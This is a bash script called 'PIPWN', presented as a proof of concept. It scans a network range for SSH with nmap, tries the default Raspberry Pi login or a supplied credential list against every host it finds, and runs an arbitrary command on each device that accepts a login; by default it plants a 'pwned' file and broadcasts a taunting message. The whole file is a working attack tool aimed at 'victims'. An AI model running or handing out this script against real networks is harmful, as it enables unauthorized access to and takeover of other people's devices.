#!/bin/bash

GREEN="\e[32m"
RED="\e[31m"
YELLOW="\e[33m"
CYAN="\e[36m"
NONE="\e[39m\e[0m"
BOLD="\e[1m"
MAGENTA="\e[34m"

# Make sure sshpass is installed
sshpass_installed=$(which sshpass)
if [[ -z $sshpass_installed ]]; then
    echo -e "$RED[-] Please install sshpass first$NONE"
    echo -e "(to do so, run 'apt-get install sshpass')"
    exit 1
fi

sploits="/tmp/vulnerable-raspies.lst"
echo "" > $sploits

if [[ $# -lt 1 ]]; then
    echo "[-] Please specify a network range (i.e. 192.168.1.0/24)"
    echo "[-] Example: ./raspexploit.sh 192.168.1.0/24 logins.lst"
    exit 1
fi

logins="pi:raspberry"
if [[ $# == 2 ]]; then
    logins=$(cat $2)
    echo -e "Found$BOLD $(cat $2 | wc -l) logins$NONE in $2"
fi

if [[ $# == 3 ]]; then
    cmd=$3
fi

function red() { echo -e "$RED$1$NONE"; }

function green() { echo -e "$GREEN$1$NONE"; }

function banner() {
    echo -e ""
    echo -e "[*] Welcome to$BOLD PIPWN V. 0.1$NONE ('Proof-of-Concept')"
    echo -e "[*] Hacked together by$BOLD steps (zombielabs.de)$NONE"
    echo -e "$NONE"
    echo -e "$RED _|_|_|   $GREEN _|_|_|   $YELLOW   _|_|_|  $CYAN  _|          _| $MAGENTA _|      _|"
    echo -e "$RED _|    _| $GREEN   _|     $YELLOW   _|    _|$CYAN  _|          _| $MAGENTA _|_|    _|"
    echo -e "$RED _|_|_|   $GREEN   _|     $YELLOW   _|_|_|  $CYAN  _|    _|    _| $MAGENTA _|  _|  _|"
    echo -e "$RED _|       $GREEN   _|     $YELLOW   _|      $CYAN    _|  _|  _|   $MAGENTA _|    _|_|"
    echo -e "$RED _|       $GREEN _|_|_|   $YELLOW   _|      $CYAN      _|  _|     $MAGENTA _|      _|"
    echo "" && echo -e "$NONE"
}

function exit_on_problem() {
    if [[ "x$1" != "x0" ]]; then
        red " ERROR, return code is $BOLD$1"
        exit $1
    else
        green "$BOLD DONE"
    fi
}

banner

#count=$(cat $2 | wc -l)
#echo -e "[*] Found $BOLD$count logins$NONE"

echo -ne "[*] Scanning network $BOLD$1$NONE for possible victims..."
nmap -sV -p22 -oG /tmp/nmap $1 >> /dev/null 2>&1
exit_on_problem $?

echo -e "[*] Filtering result set..."
victims=0

list=$(cat /tmp/nmap | grep -i ports | grep open | cut -d' ' -f2) 

for host in $list
do 
    green "[+] Possible victim: $BOLD$host$NONE"
    victims=$(($victims+1))
done

if [[ $victims == 0 ]]; then
    echo -e "$RED[-] Sorry, no victims$NONE" && exit 0
fi

vulncount=0



for host in $list
do
    vuln=0
    echo -e "[*] Checking vulnerability of $host..."
    for login in $logins
    do
        user=$(echo $login | cut -d':' -f1)
    	pass=$(echo $login | cut -d':' -f2)
    	echo -e "[*] Trying $GREEN$user$NONE@$GREEN$host$NONE with password $GREEN$pass$NONE"
    	sshpass -p $pass ssh -oStrictHostKeyChecking=no $user@$host date >> /dev/null 2>&1
    	if [[ "x$?" == "x0" ]]; then
    	    green "[+] Host is vulnerable: $user:$pass"
    	    echo "$host:$user:$pass">>$sploits
                vulncount=$(($vulncount+1))
    	fi
    done
done

if [[ $vulncount == 0 ]]; then
    echo -e "$RED[-] Sorry, no vulnerable victims in the network$NONE"
    exit 2
fi

pwncount=0

for creds in $(cat $sploits)
do
    h=$(echo $creds | cut -d':' -f1)
    u=$(echo $creds | cut -d':' -f2)
    p=$(echo $creds | cut -d':' -f3)
    echo -ne "[*] Attempting to pwn $h as $u..."
    if [[ -z $cmd ]]; then
        cmd='echo You got pwned by steps > ~/.pwned && echo Sorry, you got yourself pwned | wall >> /dev/null 2>&1'
    fi
    sshpass -p $p ssh -oStrictHostKeyChecking=no $u@$h $cmd >> /dev/null 2>&1
    if [[ "x$?" == "x0" ]]; then
        echo -ne "$GREEN$BOLD" && echo -e "PWNED$NONE"
        pwncount=$(($pwncount+1))
    else
        echo -ne "$RED$BOLD" && echo -e "FAILED HORRIBLY$NONE"
    fi
done

if [[ $pwncount == 0 ]]; then
    echo -e "$RED[-] Sorry, could not pwn any PIs in the network$NONE"
else
    echo -e "$GREEN[+] YEAH, $pwncount PIs are pwned$NONE"
fi
